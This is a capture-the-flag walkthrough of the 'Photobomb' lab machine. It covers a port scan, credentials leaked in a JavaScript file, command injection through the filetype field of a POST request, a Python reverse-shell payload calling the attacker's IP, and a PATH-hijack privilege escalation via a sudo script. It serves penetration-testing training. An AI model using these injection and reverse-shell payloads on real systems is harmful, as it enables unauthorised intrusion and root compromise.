# Scan

```bash
ghost@localhost [01:39:44] [~/Documents/hacking/tj-null-boxes/photobomb] [master]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.11.182:22
Open 10.10.11.182:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwlzrcH3g6+RJ9JSdH4fFJPibAIpAZXAl7vCJA+98jmlaLCsANWQXth3UsQ+TCEf9YydmNXO2QAIocVR8y1NUEYBlN2xG4/7txjoXr9QShFwd10HNbULQyrGzPaFEN2O/7R90uP6lxQIDsoKJu2Ihs/4YFit79oSsCPMDPn8XS1fX/BRRhz1BDqKlLPdRIzvbkauo6QEhOiaOG1pxqOj50JVWO3XNpnzPxB01fo1GiaE4q5laGbktQagtqhz87SX7vWBwJXXKA/IennJIBPcyD1G6YUK0k6lDow+OUdXlmoxw+n370Knl6PYxyDwuDnvkPabPhkCnSvlgGKkjxvqks9axnQYxkieDqIgOmIrMheEqF6GXO5zz6WtN62UAIKAgxRPgIW0SjRw2sWBnT9GnLag74cmhpGaIoWunklT2c94J7t+kpLAcsES6+yFp9Wzbk1vsqThAss0BkVsyxzvL0U9HvcyyDKLGFlFPbsiFH7br/PuxGbqdO9Jbrrs9nx60=
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
|   256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 80 (photobomb.htb)

Looking through the website, found credential for login at http://photobomb.htb/photobomb.js.

`pH0t0:b0Mb!`

With it, I can login to http://photobomb.htb/printer.

From network inspection, I can see images are served through which seems to be Ruby application server (http://photobomb.htb/ui_images/), Sinatra.

With burpsuite interception the request, the download endpoint is vulnerable to RCE although the result cannot be seen. For example, the following payload will send call request to my machine.

```bash
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 90
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl 10.10.14.2&dimensions=30x20
```

```bash
ghost@localhost [01:59:52] [~/Documents/hacking/tj-null-boxes/photobomb] [master *]
-> % python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.182 - - [25/Oct/2022 02:00:40] "GET / HTTP/1.1" 200 -
```

# User

So with the following payload, I can get reverse shell.

```bash
export RHOST="10.10.14.2";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;export%20RHOST%3D%2210.10.14.2%22%3Bexport%20RPORT%3D4444%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27&dimensions=30x20
```

```bash
$ cd ~

$ cat user.txt
0f974b12e50610831294cb941583363f
```

# Privilege escalation

```bash
$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

It can run `/opt/cleanup.sh` as sudo without password.

```bash
wizard@photobomb:~$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

From the script, we can see that it is using `find` as relative path not absolute. Therefore, we can take advantage of `PATH` variable to look up other directory that has `find` script before the actual `find` command.

```bash
wizard@photobomb:~$ cd /tmp

wizard@photobomb:/tmp$ touch find

wizard@photobomb:/tmp$ which bash
/usr/bin/bash

ewizard@photobomb:/tmp$echo "/usr/bin/bash" > find

wizard@photobomb:/tmp$ cat find
/usr/bin/bash

wizard@photobomb:/tmp$ chmod +x find

wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh

root@photobomb:/home/wizard/photobomb#

root@photobomb:/home/wizard/photobomb# cat /root/root.txt
052c3af8720c10229c67f19048a1a2fa
```
